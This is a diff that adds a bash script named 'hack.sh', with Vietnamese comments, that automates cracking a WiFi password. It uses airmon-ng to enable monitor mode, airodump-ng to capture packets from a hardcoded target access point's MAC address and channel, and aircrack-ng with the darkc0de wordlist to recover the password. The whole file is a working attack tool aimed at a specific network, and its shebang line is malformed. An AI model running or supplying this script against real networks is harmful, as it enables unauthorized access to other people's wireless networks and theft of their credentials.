@@ -1,0 +1,38 @@
+#/bin/bash
+# Usage: ./hack.sh <command>
+#       mon: Prepare wifi monitor mode
+#       capture: Capture wifi packets
+#       crack: Crack wifi password from capture packets and try to parse password from password list
+
+
+# wifi cần hack
+AP_MAC="64:D9:54:BC:C5:9E"
+AP_CHANNEL=11
+
+# Cấu hình
+WLAN_IF=wlp3s0
+WORD_LIST=darkc0de.txt
+
+do_mon() {
+  airmon-ng stop mon0
+  airmon-ng start wlp3s0
+}
+
+do_capture() {
+  AP_MAC=$1
+  AP_CHANNEL=$2
+
+  airodump-ng mon0 --bssid $AP_MAC --channel $AP_CHANNEL --write wireshark
+}
+
+do_crack() {
+  aircrack-ng wireshark-01.cap -w $WORD_LIST
+}
+
+if [ "$1" = "mon" ]; then
+   do_mon
+elif [ "$1" = "capture" ]; then
+   do_capture $AP_MAC $AP_CHANNEL
+elif [ "$1" = "crack" ]; then
+   do_crack
+fi
